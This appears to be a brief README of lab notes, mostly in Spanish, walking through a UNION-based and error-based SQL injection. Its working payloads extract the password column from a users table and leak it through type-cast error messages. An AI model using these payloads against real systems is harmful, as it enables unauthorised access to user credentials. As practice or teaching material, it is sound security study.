# GadgetChain-Java


1. Compruebo la comilla simple, apostrofe `'`     
2. `1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--` Con null’s hasta comprobar cual no me retorna errores, en este caso 8 null’s pero junto con UNION efectivamente, el 1 es para crear una tabla de consulta.     
3. `' UNION SELECT NULL, NULL, NULL, password, NULL, NULL, NULL, NULL FROM users--` Verificar que se puede seleccionar la columna password de la tabla users e insertarla en el resultado de la consulta original, y en la posición correcta, ya que el orden de las columnas es muy importante.
4. `' UNION SELECT NULL, NULL, NULL, CAST(password AS VARCHAR), NULL, NULL, NULL, NULL FROM users--` Intentar convertir la columna password a VARCHAR, que suele ser el tipo de dato correcto, pero es posible que no nos deje pasar alguna validación de tipo de datos por como se muestra por pantalla.
5. `' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users—` → displays the password in the error message.